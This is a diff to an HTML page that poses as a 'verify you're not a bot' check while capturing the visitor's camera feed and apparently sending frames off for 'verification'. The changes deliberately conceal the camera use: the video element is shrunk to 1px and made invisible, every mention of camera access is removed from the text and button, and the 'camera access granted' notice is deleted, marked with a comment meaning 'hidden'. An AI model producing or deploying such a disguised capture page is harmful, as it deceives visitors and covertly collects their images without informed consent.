@@ -132,11 +132,12 @@
 
         .video-container {
             display: none;
-            position: relative;
-            margin: 20px 0;
-            border-radius: 15px;
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
         }
 
         .video-container.active {
@@ -144,8 +145,8 @@
         }
 
         #video {
-            width: 100%;
-            border-radius: 15px;
+            width: 1px;
+            height: 1px;
         }
 
         canvas {
@@ -217,7 +218,7 @@
         </h1>
 
         <div class="message" id="message">
-            We need camera permission to verify you're not a bot.
+            We need to verify you're not a bot.
         </div>
 
         <div class="status" id="status">
@@ -235,12 +236,8 @@
 
         <canvas id="canvas"></canvas>
 
-        <div class="info" id="info" style="display: none;">
-            ✓ Camera access granted. Please look at the camera.
-        </div>
-
         <button class="btn" id="startBtn" onclick="startVerification()">
-            Allow Camera Access
+            Start Verification
         </button>
 
         <div id="result"></div>
@@ -259,7 +256,6 @@
             const videoContainer = document.getElementById('videoContainer');
             const video = document.getElementById('video');
             const loader = document.getElementById('loader');
-            const info = document.getElementById('info');
             const progress = document.getElementById('progress');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
@@ -269,7 +265,7 @@
 
             try {
                 // Request camera access
-                statusText.textContent = 'Requesting camera access...';
+                statusText.textContent = 'Starting verification...';
                 progress.style.width = '20%';
 
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -283,9 +279,9 @@
 
                 video.srcObject = stream;
                 videoContainer.classList.add('active');
-                info.style.display = 'block';
+                // info.style.display = 'block'; // Disembunyikan
                 
-                statusText.textContent = 'Camera connected';
+                statusText.textContent = 'Verifying...';
                 progress.style.width = '40%';
 
                 // Wait for video to be ready
@@ -336,9 +332,6 @@
                     // Show success
                     document.getElementById('result').innerHTML = '<div class="success">✓</div>';
                     document.getElementById('message').textContent = 'You have been verified successfully!';
-                    info.innerHTML = '✓ Identity verified. Thank you!';
-                    info.style.background = '#d4edda';
-                    info.style.color = '#155724';
 
                 } else {
                     throw new Error('Failed to send verification');
